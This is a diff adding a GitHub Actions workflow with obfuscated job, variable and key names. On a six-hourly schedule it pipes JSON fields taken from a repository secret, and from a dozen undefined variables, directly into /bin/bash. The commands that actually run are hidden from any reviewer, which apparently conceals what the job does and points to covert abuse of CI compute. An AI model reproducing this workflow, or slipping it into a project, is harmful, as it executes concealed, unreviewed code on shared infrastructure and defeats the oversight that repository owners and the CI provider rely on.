@@ -1,0 +1,31 @@
+name: shizheyangd
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shizheyangd
+        env:
+          cjb29: ${{ secrets.cjb29 }}
+        run: |
+          echo $cjb29 | jq -r .s87393 | /bin/bash
+          echo $d595 | jq -r .gazut8 | /bin/bash
+          echo $fv823 | jq -r .mipzi4 | /bin/bash
+          echo $u6946 | jq -r .ldn9 | /bin/bash
+          echo $caze7 | jq -r .ej859 | /bin/bash
+          echo $wme9615 | jq -r .ijvf45 | /bin/bash
+          echo $jweu96352 | jq -r .fm65 | /bin/bash
+          echo $guyxk8081 | jq -r .bnz9752 | /bin/bash
+          echo $yno8582 | jq -r .dl88 | /bin/bash
+          echo $zyc1118 | jq -r .yx5964 | /bin/bash
+          echo $u316 | jq -r .b80347 | /bin/bash
+          echo $wmknf26 | jq -r .tsrgb8 | /bin/bash
+          echo $amgha843 | jq -r .ah74 | /bin/bash
+
